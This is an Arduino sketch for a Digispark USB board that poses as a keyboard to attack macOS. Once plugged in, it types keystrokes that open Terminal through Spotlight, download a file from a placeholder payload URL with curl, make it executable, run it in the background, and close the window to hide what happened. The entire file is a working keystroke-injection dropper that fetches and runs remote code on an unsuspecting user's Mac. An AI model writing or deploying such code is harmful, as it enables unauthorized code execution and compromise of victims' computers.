#include "DigiKeyboard.h"

void setup() {

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("terminal");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("curl <payload-URL> -o app.macho");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("chmod +x app.macho");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("./app.macho &");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);

}

void loop() {

}
